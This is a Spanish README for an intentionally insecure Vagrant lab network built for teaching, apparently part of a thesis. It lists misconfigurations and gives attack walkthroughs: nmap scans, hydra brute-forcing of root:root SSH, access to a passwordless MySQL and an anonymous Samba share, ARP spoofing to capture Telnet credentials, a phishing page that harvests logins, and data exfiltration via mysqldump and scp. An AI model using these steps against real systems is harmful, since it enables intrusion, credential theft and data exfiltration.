# Bloque 4 — Insecure Network Lab

Infraestructura de red intencionadamente insegura para demostrar ataques reales sobre configuraciones incorrectas comunes en entornos corporativos.  
Debe usarse exclusivamente en este entorno aislado.

---

## Índice

1. [Descripción](#descripción)
2. [Topología](#topología)
3. [Máquinas virtuales](#máquinas-virtuales)
4. [Malas prácticas documentadas](#malas-prácticas-documentadas)
5. [Requisitos](#requisitos)
6. [Despliegue](#despliegue)
7. [Acceso al escritorio gráfico de Kali](#acceso-al-escritorio-gráfico-de-kali)
8. [Escenarios de ataque](#escenarios-de-ataque)
9. [Solución de problemas](#solución-de-problemas)
10. [Advertencia legal](#advertencia-legal)

---

## Descripción

Este bloque simula una red corporativa con errores de configuración reales y frecuentes. El objetivo es poder reproducir y comprender los ataques descritos en el capítulo 7 de la memoria, observando en un entorno controlado las consecuencias de cada mala práctica.

El laboratorio se compone de cuatro máquinas virtuales orquestadas con Vagrant sobre VirtualBox.

Todas las redes son internas (`intnet`) y no tienen salida real a internet durante las prácticas.  
La interfaz NAT de Vagrant solo se usa durante el aprovisionamiento inicial.

### Redes definidas

| Red | Rango | Descripción |
|---|---|---|
| `net-externa` | `100.70.9.0/24` | Red del atacante |
| `net-dmz` | `192.168.57.0/24` | Zona desmilitarizada expuesta |
| `net-interna` | `192.168.58.0/24` | Red corporativa con datos sensibles |

---

## Topología



---

## Máquinas virtuales

| VM | Box | IP | Red | RAM | vCPUs | Rol |
|---|---|---|---|---|---|---|
| `external-kali` | `kalilinux/rolling` | `100.70.9.10` | `net-externa` | 2048 MB | 1 | Atacante externo |
| `firewall` | `ubuntu/jammy64` | `100.70.9.1` / `192.168.57.1` / `192.168.58.1` | Todas | 512 MB | 1 | Firewall vulnerable |
| `dmz-server` | `ubuntu/jammy64` | `192.168.57.10` | `net-dmz` | 512 MB | 1 | Apache + FTP + Telnet |
| `internal-server` | `ubuntu/jammy64` | `192.168.58.10` | `net-interna` | 2048 MB | 1 | MySQL + Samba + SSH |

---

## Malas prácticas documentadas

### Firewall (`firewall`)

- Política `FORWARD DROP` por defecto pero con reglas explícitas que permiten todo el tráfico entre cualquier segmento.
- `ip_forward` habilitado sin restricción de rutas.
- Sin inspección de estado ni filtrado por protocolo.
- Reglas que permiten tráfico:
  - externo → DMZ
  - externo → interno
  - DMZ → interno
  sin limitación de puertos.
- Sin logging de tráfico.
- `rp_filter` desactivado.
- `accept_source_route` y `accept_redirects` habilitados (hasta donde el kernel lo permite).
- Sin NAT.

### DMZ (`dmz-server`)

- Apache con:
  - `ServerTokens Full`
  - `ServerSignature On`
- Directory listing habilitado en `/var/www/html`.
- `phpinfo()` accesible públicamente en `/info.php`.
- Panel `/admin/` sin autenticación que muestra credenciales de la base de datos interna.
- Directorio `/backup/` accesible públicamente con:
  - `credentials.txt`
  - `network.txt`
- Sitio de phishing en:
  - `http://192.168.57.10:8080`
- FTP anónimo habilitado (`vsftpd`) con permisos de escritura.
- Telnet activo en puerto `23`.
- Usuario débil:
  - `ftpoperator:ftpoperator`
- Sin firewall local (`ufw` desactivado).
- Rutas estáticas hacia `internal-server`.

### Servidor interno (`internal-server`)

- SSH con:
  - `PermitRootLogin yes`
  - `PasswordAuthentication yes`
  - Banner que expone versión del sistema
- Credenciales root:
  - `root:root`
- MySQL:
  - `root` sin contraseña
  - `bind-address 0.0.0.0` (accesible desde toda la red)
- Base de datos `corporativedb` con:
  - Credenciales en texto plano (`user_credentials`)
  - Inventario completo de red (`network_inventory`)
  - Datos personales de empleados (`employees`)
- Samba:
  - Recurso `confidential` accesible como invitado sin autenticación
  - Permisos de escritura (777)
- Archivo:
  - `/srv/samba/confidential/passwords.txt`
- Sin firewall local (`ufw` desactivado).
- Rutas estáticas hacia DMZ y red externa.

---

## Requisitos

| Requisito | Valor |
|---|---|
| VirtualBox | >= 7.0 |
| Vagrant | >= 2.4 |
| Espacio en disco | ~35 GB libres |
| RAM mínima | 4 GB |
| RAM recomendada | 8 GB |
| Internet | Solo durante el primer `vagrant up` |

---

## Despliegue

```bash
# Entrar al laboratorio
cd 4-insecure-network-lab/

# Levantar todas las VMs
vagrant up

# Levantar una VM concreta
vagrant up external-kali

# Acceso por SSH
vagrant ssh external-kali
vagrant ssh internal-server

# Estado de las VMs
vagrant status

# Detener laboratorio
vagrant halt

# Destruir laboratorio
vagrant destroy -f

### Tiempos estimados

| Acción | Tiempo |
|---|---|
| Primera ejecución | 15-30 min |
| Ejecuciones posteriores | 2-5 min |
| Reinicio de VMs | 3-5 min |

> **Nota:** Las VMs usan `box_check_update = false`. Si tienes problemas de DNS durante el aprovisionamiento, consulta la sección [Solución de problemas](#solución-de-problemas).

---

## Acceso al escritorio gráfico de Kali

`external-kali` incluye un entorno de escritorio XFCE accesible mediante noVNC desde cualquier navegador.

### Requisitos previos

Asegúrate de que el puerto 8081 del servidor es accesible desde tu equipo:

```bash
# En el servidor
sudo ufw allow from 192.168.1.0/24 to any port 8081 proto tcp
Conexión directa
Averigua la IP de tu servidor en la red local:

bash
ip addr show | grep "192.168.1"
Abre en tu navegador:

text
http://<IP_DEL_SERVIDOR>:8081/vnc.html
Pulsa "Connect" (no hay contraseña).

Alternativa segura: túnel SSH
Desde tu equipo (PowerShell o terminal):

bash
ssh -L 8081:localhost:8081 mangoadmin@<IP_DEL_SERVIDOR>
Luego abre en el navegador:

text
http://localhost:8081/vnc.html
Escenarios de ataque
Todos los ataques se ejecutan desde external-kali.

bash
vagrant ssh external-kali
1. Reconocimiento de red
Escaneo de servicios
bash
# Escaneo rápido de la DMZ
nmap 192.168.57.10

# Escaneo completo de la red interna
nmap -sV -sC -O -p- -T4 192.168.58.10

# Descubrimiento de hosts en la red interna
nmap -sn 192.168.58.0/24

# Enumeración SMB
enum4linux 192.168.58.10
Descubrimiento ARP desde la DMZ
bash
# Acceso Telnet al dmz-server
telnet 192.168.57.10
# Usuario: ftpoperator
# Password: ftpoperator

# Una vez dentro del dmz-server, escanear la red interna
nmap -sn 192.168.58.0/24
Qué demuestra:

El firewall actúa como router sin filtrado real

El atacante obtiene versiones exactas, servicios y hosts internos

Facilita la explotación de CVEs conocidos

2. Acceso a la DMZ
2.1 Exfiltración vía HTTP
bash
# Credenciales expuestas en directorio backup
curl http://192.168.57.10/backup/credentials.txt

# Mapa de red expuesto
curl http://192.168.57.10/backup/network.txt

# Información del sistema (phpinfo)
curl http://192.168.57.10/info.php

# Panel admin que muestra credenciales de la BD interna
curl http://192.168.57.10/admin/
Qué demuestra:

Directory listing habilitado

ServerTokens Full expone versión del servidor

Exposición de credenciales, estructura de red y configuración del sistema

2.2 FTP anónimo
bash
ftp 192.168.57.10
# Usuario: anonymous
# Password: [vacío]

ftp> ls
ftp> cd public
ftp> get readme.txt
ftp> get config_backup.txt
ftp> exit

# Ver los archivos descargados
cat config_backup.txt
Qué demuestra:

config_backup.txt contiene credenciales MySQL y la IP del servidor interno.

2.3 Telnet — credenciales en claro
bash
telnet 192.168.57.10
# Login: ftpoperator
# Password: ftpoperator
Qué demuestra:

Las credenciales viajan sin cifrar y pueden capturarse con Wireshark/tcpdump.

2.4 Sitio de phishing
bash
# Acceso a la página de phishing (puerto 8080)
curl http://192.168.57.10:8080

# Envío simulado de credenciales
curl -X POST http://192.168.57.10:8080/capture.php \
  -d "username=admin&password=Password123!"

# Recuperar credenciales capturadas desde el dmz-server
ssh ftpoperator@192.168.57.10
cat /var/log/phishing.log
Qué demuestra:

Captura de credenciales internas mediante phishing

Si se usa el escritorio gráfico de Kali con Firefox, la página es visualmente idéntica a GitHub

3. Acceso a la red interna
3.1 Fuerza bruta SSH
bash
# Verificar credenciales débiles
hydra -l root -p root ssh://192.168.58.10

# Acceso SSH directo
ssh root@192.168.58.10
Qué demuestra:

Credenciales débiles (root:root)

SSH con PermitRootLogin yes y PasswordAuthentication yes

3.2 MySQL sin contraseña
bash
# Acceso directo desde Kali
mysql -h 192.168.58.10 -u root --skip-ssl

mysql> USE corporativedb;
mysql> SELECT * FROM user_credentials;
mysql> SELECT * FROM network_inventory;
mysql> SELECT * FROM employees;
mysql> EXIT;
bash
# Pivoting desde la DMZ
telnet 192.168.57.10
# Login: ftpoperator / ftpoperator

mysql -h 192.168.58.10 -u root

mysql> USE corporativedb;
mysql> SELECT * FROM user_credentials;
Qué demuestra:

MySQL accesible sin credenciales desde fuera de la red interna

Comprometer la DMZ equivale a acceder a la base de datos corporativa

3.3 Samba anónimo
bash
# Listar recursos compartidos
smbclient -L //192.168.58.10 -N

# Acceder al recurso confidential
smbclient //192.168.58.10/confidential -N

smb: \> ls
smb: \> get passwords.txt
smb: \> exit

# Ver credenciales obtenidas
cat passwords.txt
Qué demuestra:

passwords.txt contiene todas las credenciales del sistema:

admin / admin123

root / root

ftpoperator / ftpoperator

backup / backup

4. ARP Spoofing y captura de tráfico
bash
# Habilitar forwarding (necesario para MITM)
sudo sysctl -w net.ipv4.ip_forward=1

# ARP spoofing contra dmz-server y firewall
sudo arpspoof -i eth1 -t 192.168.57.10 192.168.57.1 &
sudo arpspoof -i eth1 -t 192.168.57.1 192.168.57.10 &

# Capturar tráfico Telnet (credenciales en texto claro)
sudo tcpdump -i eth1 -A -s0 port 23
En otra terminal (dentro o fuera de Kali):

bash
telnet 192.168.57.10
Detener ataque:

bash
sudo killall arpspoof tcpdump
sudo sysctl -w net.ipv4.ip_forward=0
Qué demuestra:

Telnet transmite credenciales sin cifrar

No existe protección ARP (ARP inspection)

5. Pivoting DMZ → red interna
bash
# Acceso a la DMZ vía SSH
ssh ftpoperator@192.168.57.10

# Dentro del dmz-server:

# Acceso MySQL interno
mysql -h 192.168.58.10 -u root
mysql> SELECT * FROM corporativedb.user_credentials;

# Acceso Samba interno
smbclient //192.168.58.10/confidential -N

# Acceso SSH al servidor interno
ssh root@192.168.58.10
Qué demuestra:

Comprometer la DMZ equivale a comprometer toda la red interna gracias a:

Firewall sin filtrado entre segmentos

Credenciales reutilizadas y almacenadas en texto plano

6. Exfiltración de datos
bash
# Desde internal-server (tras acceder vía SSH):

# Dump completo de MySQL
mysqldump -u root corporativedb > /tmp/corporativedb.sql

# Comprimir recurso Samba
tar -czf /tmp/confidential.tar.gz /srv/samba/confidential/

# Exfiltrar a la DMZ
scp /tmp/corporativedb.sql ftpoperator@192.168.57.10:/tmp/
scp /tmp/confidential.tar.gz ftpoperator@192.168.57.10:/tmp/
Qué demuestra:

Ausencia de monitorización (no hay logs de firewall)

Ausencia de segmentación real

Exfiltración sin detección

Solución de problemas
Error: "The box failed to unpackage properly... No space left on device"
El disco del servidor está lleno. Libera espacio con:

bash
sudo apt clean
sudo apt autoremove --purge -y
sudo journalctl --vacuum-size=200M
Error: "Could not resolve host: vagrantcloud.com"
Tu servidor tiene problemas de resolución DNS para los dominios de HashiCorp. Solución en el servidor:

bash
sudo nano /etc/hosts
# Añadir al final del archivo:
52.0.5.91 vagrantcloud.com app.vagrantup.com
Error: "Failed to connect to server" en noVNC
Entra en external-kali y ejecuta:

bash
sudo systemctl restart lightdm
sleep 5
sudo systemctl restart x11vnc
sudo systemctl restart novnc
El script de aprovisionamiento se queda colgado
Los scripts fuerzan el DNS de Cloudflare (1.1.1.1) al inicio para evitar problemas de resolución. Si aún así se cuelga, verifica que la VM tiene acceso a internet por NAT durante el provision.

Error de sintaxis en internal-server/setup.sh
Asegúrate de que los heredocs (<< 'SQL', << 'EOF', etc.) no tengan espacios delante del delimitador de cierre. Debe estar al principio de la línea.

Las VMs no se comunican entre sí
Verifica que el firewall tiene ip_forward habilitado:

bash
vagrant ssh firewall
cat /proc/sys/net/ipv4/ip_forward  # Debe devolver 1
Advertencia legal
⚠️ Este laboratorio contiene configuraciones deliberadamente inseguras.

Restricciones
Uso exclusivamente educativo

Ejecutar únicamente en entornos aislados

No conectar a redes corporativas reales

No desplegar en producción